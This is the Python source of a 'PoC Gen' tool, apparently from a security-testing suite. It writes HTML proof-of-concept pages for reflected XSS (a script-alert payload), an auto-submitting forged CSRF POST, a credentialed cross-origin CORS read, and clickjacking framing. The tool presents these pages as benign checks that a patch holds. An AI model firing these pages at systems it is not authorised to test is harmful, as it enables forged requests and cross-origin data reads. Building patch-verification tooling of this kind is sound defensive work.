import sys
import os
import argparse
import datetime
import html
import json

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


class PocGen(VibeTool):
    def __init__(self):
        super().__init__("PoC Gen", "Exploit Proof-of-Concept Generator")

    def run(self, vuln_type, target_url, output_dir):
        self.banner()

        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        poc_filename = os.path.join(output_dir, f"{vuln_type}_poc_{timestamp}.html")
        safe_url_html = html.escape(target_url, quote=True)
        safe_url_js = json.dumps(target_url)

        vtype = vuln_type.lower()
        if vtype == "xss":
            sep = "&amp;" if "?" in safe_url_html else "?"
            content = f"""<!DOCTYPE html>
<!-- VibeHacking XSS PoC (Benign) -->
<html>
<head><meta charset="utf-8"><title>Verify XSS Patch</title></head>
<body>
    <h2>Testing Reflected XSS on: <code>{safe_url_html}</code></h2>
    <p>If an alert box pops up inside the frame, the vulnerability is still active.</p>
    <iframe src="{safe_url_html}{sep}q=%3Cscript%3Ealert('VibeHacking_XSS_Active')%3C/script%3E" width="100%" height="400px"></iframe>
</body>
</html>"""
        elif vtype == "csrf":
            content = f"""<!DOCTYPE html>
<!-- VibeHacking CSRF PoC (Benign) -->
<html>
<head><meta charset="utf-8"><title>Verify CSRF Patch</title></head>
<body>
    <h2>Testing CSRF on: <code>{safe_url_html}</code></h2>
    <p>Loading this page auto-submits a forged cross-site POST request. If it succeeds, the app lacks CSRF tokens / SameSite protection.</p>
    <form action="{safe_url_html.rstrip('/')}/api/subscribe" method="POST" id="csrfForm">
        <input type="hidden" name="channel_id" value="vibehacking_test" />
    </form>
    <script>document.getElementById('csrfForm').submit();</script>
</body>
</html>"""
        elif vtype == "cors":
            content = f"""<!DOCTYPE html>
<!-- VibeHacking CORS Misconfiguration PoC (Benign) -->
<html>
<head><meta charset="utf-8"><title>Verify CORS Policy Patch</title></head>
<body>
    <h2>Testing Credentialed Cross-Origin Read on: <code>{safe_url_html}</code></h2>
    <pre id="out">Running cross-origin fetch...</pre>
    <script>
      fetch({safe_url_js}, {{ credentials: 'include' }})
        .then(r => r.text())
        .then(t => {{
          document.getElementById('out').textContent = 'VULNERABLE — Cross-origin response read (' + t.length + ' bytes):\\n' + t.slice(0, 500);
        }})
        .catch(e => {{
          document.getElementById('out').textContent = 'SAFE — Browser blocked cross-origin read: ' + e;
        }});
    </script>
</body>
</html>"""
        elif vtype == "clickjacking":
            content = f"""<!DOCTYPE html>
<!-- VibeHacking Clickjacking PoC (Benign) -->
<html>
<head><meta charset="utf-8"><title>Verify Clickjacking / Frame-Ancestors Patch</title></head>
<body>
    <h2>Testing Clickjacking Protection on: <code>{safe_url_html}</code></h2>
    <p>If the target application renders inside the frame below, X-Frame-Options / CSP frame-ancestors is missing.</p>
    <iframe src="{safe_url_html}" width="100%" height="500px" style="border:2px solid #f43f5e;"></iframe>
</body>
</html>"""
        else:
            self.log(f"Unsupported type '{vuln_type}'. Use 'xss', 'csrf', 'cors', or 'clickjacking'.", "fail")
            return

        try:
            with open(poc_filename, "w", encoding="utf-8") as f:
                f.write(content)
            self.log(f"PoC generated: {poc_filename}", "pass")
            self.log("Open this file in a browser while logged into the app to verify your patch holds", "info")
        except OSError as e:
            self.log(f"Failed to write PoC file: {e}", "fail")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC Gen - Exploit Proof-of-Concept Generator")
    parser.add_argument("--type", choices=["xss", "csrf", "cors", "clickjacking"], default="xss", help="PoC type to generate")
    parser.add_argument("--url", required=True, help="Vulnerable endpoint (e.g. http://localhost:3456/search)")
    parser.add_argument("--out", default=os.path.join(_root, "logs"), help="Output directory for PoC file")
    parser.add_argument('-v', '--version', action='version', version='PoC Gen 1.0.0')
    args = parser.parse_args()

    PocGen().run(args.type, args.url, args.out)
